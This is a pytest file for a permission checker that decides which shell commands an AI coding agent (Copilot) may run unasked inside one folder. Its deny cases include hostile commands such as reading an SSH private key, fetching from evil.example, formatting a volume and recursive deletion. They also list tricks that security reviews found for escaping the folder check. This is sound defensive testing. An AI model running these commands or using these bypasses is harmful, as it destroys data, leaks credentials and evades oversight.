"""Copilot's "run freely in this folder" (#352): what The Chat Place answers
for you, and what still asks. Errs toward asking (copilot_folder). Each of
the bypasses two independent security reviews found is a case here."""
import os
import sys
from types import SimpleNamespace

import pytest

from markers import windows_paths
from thechatplace.providers import copilot_folder
from thechatplace.providers.copilot_runtime import COMMAND, FILES, OTHER

posix_only = pytest.mark.skipif(sys.platform == "win32", reason="bash and zsh commands")


@pytest.fixture
def folder(tmp_path):
    work = tmp_path / "work"
    (work / "sub").mkdir(parents=True)
    (work / "notes.txt").write_text("hello", encoding="utf-8")
    return str(work)


@windows_paths
@pytest.mark.parametrize("command", [
    "Get-Item notes.txt",
    "Get-ChildItem sub",
    "Get-Content notes.txt | Select-Object -First 1",
    "Set-Content sub\\out.txt 'hi'",
    "New-Item -ItemType Directory -Path build",
    "Remove-Item sub\\old.txt -Force",
    "Copy-Item notes.txt sub\\copy.txt",
    "Get-ChildItem sub && Get-Content notes.txt",
    "echo synthetic",
    "Test-Path 'sub\\a file.txt'",
    "ni sub\\new.txt",
])
def test_plain_file_commands_inside_the_folder_are_allowed_on_windows(folder, command):
    assert copilot_folder.command_allowed(command, folder)


@posix_only
@pytest.mark.parametrize("command", [
    "ls sub", "cat notes.txt", "cp notes.txt sub/copy.txt", "mv sub/a sub/b",
    "rm sub/old.txt", "echo synthetic", "pwd", "cat notes.txt; ls",
])
def test_plain_file_commands_inside_the_folder_are_allowed_elsewhere(folder, command):
    assert copilot_folder.command_allowed(command, folder)


@windows_paths
def test_a_full_path_inside_the_folder_is_allowed(folder):
    assert copilot_folder.command_allowed(f"Get-Item '{folder}{os.sep}notes.txt'", folder)


@pytest.mark.parametrize("command", [
    "Get-Content ..\\secret.txt",                    # the parent folder
    "Get-Content C:\\Windows\\win.ini",              # another folder by full path
    "Get-Item -Path:C:\\Windows",                    # the same, as -Name:value
    "Get-Content $env:USERPROFILE\\.ssh\\id_rsa",     # a variable
    "Get-Content ~\\notes.txt",                      # the home folder
    "Get-ChildItem \\\\server\\share",               # a network path
    "Get-ChildItem \\Windows",                       # the root of the drive
    "Get-ChildItem HKLM:\\Software",                 # the registry
    "Get-ChildItem Env:",                            # another provider
    "Invoke-WebRequest https://example.com",         # the network
    "iwr https://example.com",
    "Start-Process notepad",                         # other programs
    "git status",
    "python script.py",
    ".\\script.ps1",
    "& .\\tool.exe",                                 # the call operator
    "Get-ChildItem | ForEach-Object { Remove-Item $_ }",  # code
    "Get-Item notes.txt`; Remove-Item C:\\x",          # an escape
    "Set-ItemProperty -Path notes.txt -Name x -Value y",
    "Invoke-Expression 'Remove-Item x'",
    "",
    "   ",
    # The first security review: each ran code or reached outside the folder.
    "Get-Item (Start-Process calc)",
    "Get-Content ('C'+':\\Windows\\win.ini')",
    "Write-Output (Invoke-WebRequest example.com)",
    "New-Item -ItemType Junction -Path j -Target x",
    "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList calc",
    "Format-Volume -DriveLetter D",
    "systemd-run --user xcalc",
    "Get-Content C'':\\Windows\\win.ini",
    'Get-Content C"":\\Windows\\win.ini',
    "Get-Content notes.txt,C:\\Windows\\win.ini",
    "Get-Content Microsoft.PowerShell.Core\\FileSystem::C:\\Windows\\win.ini",
    "Write-Output hi 1>C:\\x.txt",
    "cat notes.txt>/tmp/x",
    "cd; Remove-Item -Recurse -Force *",
    "cd -",
    "Set-Location sub; Get-ChildItem",
    "sort --output=/home/u/.bashrc notes.txt",
    "sort -o/tmp/x notes.txt",
    "cat <(curl evil.example)",
    "ls *(e:'curl evil':)",
    "Remove-Item sub -Recurse -Force",
    "Remove-Item sub -rec",
    "rm -rf sub",
    "Get-Content notes.txt:hidden",
    "Get-Content notes.txt > sub\\out.txt",
    "Get-Item -Path:'C:\\Windows'",
    "@('C:\\x') | Get-Item",
    # The second security review.
    "sort --compress-program sh --buffer-size 1K notes.txt",   # runs a program
    "sort --files0-from list.txt",                             # reads listed files
    "cat --files0-from list.txt",
    "Get-Content \u2018\\Windows\\win.ini\u2019",              # smart quotes
    "Get-Content \u201c\\\\host\\share\\x\u201d",
    "Remove-Item \u2013Recurse sub",                           # an en dash
    "Get-Content *",                                           # wildcards
    "cat */x",
    "Get-Item note?.txt",
    "Get-Item [n]otes.txt",
    "Copy-Item -Recurse sub dest",                             # recursion
    "Get-ChildItem -Recurse",
    "Get-ChildItem -FollowSymlink sub",
    "ls -R sub",
])
def test_anything_that_may_reach_outside_still_asks(folder, command):
    assert not copilot_folder.command_allowed(command, folder)


@posix_only
@pytest.mark.parametrize("command", ["ni sub/new", "write tim", "sort notes.txt",
                                     "Get-Content notes.txt"])
def test_only_the_simplest_programs_elsewhere(folder, command):
    """On a Mac or Linux these are programs on PATH (ni is often npm's)."""
    assert not copilot_folder.command_allowed(command, folder)


def test_file_changes_inside_the_folder_only(folder, tmp_path):
    inside = os.path.join(folder, "sub", "a.txt")
    assert copilot_folder.file_change_allowed(inside, (), folder)
    assert not copilot_folder.file_change_allowed(str(tmp_path / "elsewhere.txt"), (), folder)
    # Every file the change names must be inside.
    assert not copilot_folder.file_change_allowed(inside, (str(tmp_path / "x.txt"),), folder)
    # A diff's path that lost its leading slash (b/Users/... on a Mac) isn't
    # taken as inside the folder.
    assert not copilot_folder.file_change_allowed("", ("Users/me/x.txt",), folder)
    assert not copilot_folder.file_change_allowed("", (), folder)


def _request(method, **kw):
    return SimpleNamespace(method=method, too_long=kw.get("too_long", False),
                           command=kw.get("command", ""), file_name=kw.get("file_name", ""),
                           paths=kw.get("paths", ()), tool_kind=kw.get("tool_kind", ""))


def test_only_commands_and_file_changes_shown_in_full_are_answered(folder):
    plain = "Get-Item notes.txt" if sys.platform == "win32" else "cat notes.txt"
    assert copilot_folder.allowed(_request(COMMAND, command=plain), folder)
    assert not copilot_folder.allowed(_request(COMMAND, command=plain, too_long=True), folder)
    assert not copilot_folder.allowed(_request(OTHER), folder)
    assert not copilot_folder.allowed(_request(COMMAND, command=plain), "")
    assert copilot_folder.allowed(_request(FILES, file_name=os.path.join(folder, "notes.txt")),
                                  folder)


def test_once_you_allow_a_command_it_cant_follow_no_command_is_answered(folder):
    """Copilot's shell keeps its folder between commands. After one you
    allowed by hand that the check doesn't itself allow, the shell may be
    anywhere (cd.., cd\\, a script), so commands ask again."""
    plain = "Get-Item notes.txt" if sys.platform == "win32" else "cat notes.txt"
    for moving in ("Set-Location D:\\Other", "cd..", "cd\\", ".\\x.ps1", "iex 'cd C:\\'",
                   "git status"):
        assert copilot_folder.changes_location(moving, folder)
    assert not copilot_folder.changes_location(plain, folder)
    command = _request(COMMAND, command=plain)
    assert copilot_folder.allowed(command, folder)
    assert not copilot_folder.allowed(command, folder, location_changed=True)
    # A file change names its full path, so it still is.
    change = _request(FILES, file_name=os.path.join(folder, "notes.txt"))
    assert copilot_folder.allowed(change, folder, location_changed=True)


def test_a_file_move_always_asks(folder):
    move = _request(FILES, tool_kind="move", file_name=os.path.join(folder, "notes.txt"))
    assert not copilot_folder.allowed(move, folder)


@pytest.mark.parametrize("command", ["Get-ChildItem sub -Depth 5 -Name", "Get-ChildItem -de 2"])
def test_depth_recurses_and_asks(folder, command):
    """The third security review: -Depth recurses (through junctions on 5.1)."""
    assert not copilot_folder.command_allowed(command, folder)


@posix_only
@pytest.mark.parametrize("command", ["cp -aL sub dest", "cp -La sub dest", "ls -lL sub",
                                     "cp -aH sub dest", "rm -d sub"])
def test_only_known_option_letters_elsewhere(folder, command):
    assert not copilot_folder.command_allowed(command, folder)


# -- Copilot's review of #426 -----------------------------------------------------------


def test_a_hard_link_to_a_file_outside_isnt_inside(folder, tmp_path):
    """A hard link has no target to follow: writing to its name inside the
    folder changes the file outside it. Any file with another link asks."""
    outside = tmp_path / "secret.txt"
    outside.write_text("secret", encoding="utf-8")
    alias = os.path.join(folder, "alias.txt")
    try:
        os.link(outside, alias)
    except OSError:
        pytest.skip("this file system has no hard links")
    write = "Set-Content alias.txt x" if sys.platform == "win32" else "cat alias.txt"
    assert not copilot_folder.command_allowed(write, folder)
    assert not copilot_folder.file_change_allowed(alias, (), folder)
    # A file with only its one name is still fine.
    plain = "Get-Item notes.txt" if sys.platform == "win32" else "cat notes.txt"
    assert copilot_folder.command_allowed(plain, folder)


@pytest.mark.parametrize("command", ["cat ^notes.txt", "ls ^sub", "cat notes.txt#",
                                     "ls !(notes.txt)", "Get-Item ^notes.txt"])
def test_zsh_extended_patterns_ask(folder, command):
    """zsh's ^x means "everything but x", which can reach through a link."""
    assert not copilot_folder.command_allowed(command, folder)


# -- the two reviews of the merged #426 (Claude's and Copilot's) ---------------------------


@pytest.mark.parametrize("command", [
    "Get-ChildItem sub | Set-Content -Value pwned",       # paths piped into a writer
    "Get-ChildItem sub | Clear-Content",
    "Get-ChildItem sub | Remove-Item",
    "Get-ChildItem sub | Select-String secret",           # reads each path piped in
    "Get-ChildItem sub | Get-FileHash",
    "Get-ChildItem sub | Out-File",                       # Out-File needs its own path
    "New-Item -ItemType s -Path l -Value notes.txt",      # SymbolicLink, shortened
    "New-Item -ItemType Junc -Path j -Value sub",
    "New-Item -Type h -Path l -Value notes.txt",
    "Remove-Item sub",                                    # a folder: "Yes to All"
    "Out-File CON",                                       # devices
    "Set-Content NUL x",
    "Get-Content COM1.txt",
    "Remove-Item notes.txt -Stream Zone.Identifier",      # a file's hidden streams
    "Get-Content notes.txt -Stream x",
    "echo " + "x" * 400,                                  # too long to read in full
])
def test_what_the_reviews_of_the_merge_found_asks(folder, command):
    assert not copilot_folder.command_allowed(command, folder)


@windows_paths
@pytest.mark.parametrize("command", [
    "Get-Content notes.txt | Select-Object -First 1",
    "Get-ChildItem sub | Sort-Object Name | Format-Table",
    "Get-Content notes.txt | Out-File sub\copy.txt",
    "Copy-Item notes.txt -Destination sub\copy.txt",     # -Destination isn't -Depth
    "New-Item -ItemType Directory -Path build",
    "New-Item -ItemType f -Path new.txt",
    "Copy-Item notes.txt sub",                            # into a folder, a plain file
])
def test_plain_pipes_and_copies_are_still_allowed(folder, command):
    assert copilot_folder.command_allowed(command, folder)


def test_copying_into_a_folder_checks_the_file_written(folder, tmp_path):
    outside = tmp_path / "outside.txt"
    outside.write_text("x", encoding="utf-8")
    try:
        os.link(outside, os.path.join(folder, "sub", "notes.txt"))
    except OSError:
        pytest.skip("this file system has no hard links")
    copy = "Copy-Item notes.txt sub" if sys.platform == "win32" else "cp notes.txt sub"
    assert not copilot_folder.command_allowed(copy, folder)


@posix_only
@pytest.mark.parametrize("command", ["cat sub/\.\./\.\./secret.txt", "cat note\s.txt"])
def test_a_backslash_asks_elsewhere(folder, command):
    """bash and zsh read a backslash as an escape: sub/\.\./x is ../x."""
    assert not copilot_folder.command_allowed(command, folder)


# -- the verification passes on the fixes (Claude's and Copilot's) ------------------------


@pytest.mark.parametrize("command", [
    "Get-ChildItem sub |\nSet-Content -Value x",           # a pipe carried to the next line
    "Get-ChildItem sub |\r\nRemove-Item",
    "Get-ChildItem sub |  \nClear-Content",
    "Set-Content notes.txt -s Zone.Identifier -Value x",   # -s is -Stream
    "Get-Content notes.txt -St Zone.Identifier",
    "Remove-Item notes.txt -stre x",
    "New-Item -Path sub -Name evil -Value x",              # -Name puts it elsewhere
    "New-Item -Path sub -n evil",
    "Get-Content sub/nul",                                 # a device inside a path
    "Get-Content 'nul '",
])
def test_what_the_verification_passes_found_asks(folder, command):
    assert not copilot_folder.command_allowed(command, folder)


@windows_paths
@pytest.mark.parametrize("command", [
    "Get-ChildItem sub | cat",                             # cat is Get-Content there
    "Get-Content paths.txt | type",
    "Get-Content paths.txt | gc",
])
def test_cat_after_a_pipe_asks_on_windows(folder, command):
    assert not copilot_folder.command_allowed(command, folder)


@windows_paths
@pytest.mark.parametrize("command", [
    "Get-Content -Raw notes.txt",                          # Copilot's commonest read
    "Get-Content notes.txt -ReadCount 0",
    "Copy-Item notes.txt -Destination sub\copy.txt",
])
def test_ordinary_reads_and_copies_are_allowed(folder, command):
    assert copilot_folder.command_allowed(command, folder)


def test_a_copy_names_its_folder_first_or_last(folder, tmp_path):
    outside = tmp_path / "outside.txt"
    outside.write_text("x", encoding="utf-8")
    try:
        os.link(outside, os.path.join(folder, "sub", "notes.txt"))
    except OSError:
        pytest.skip("this file system has no hard links")
    if sys.platform == "win32":
        assert not copilot_folder.command_allowed("Copy-Item -Destination sub notes.txt", folder)
        assert not copilot_folder.command_allowed("Move-Item -Destination sub notes.txt", folder)
    else:
        assert not copilot_folder.command_allowed("cp notes.txt sub", folder)
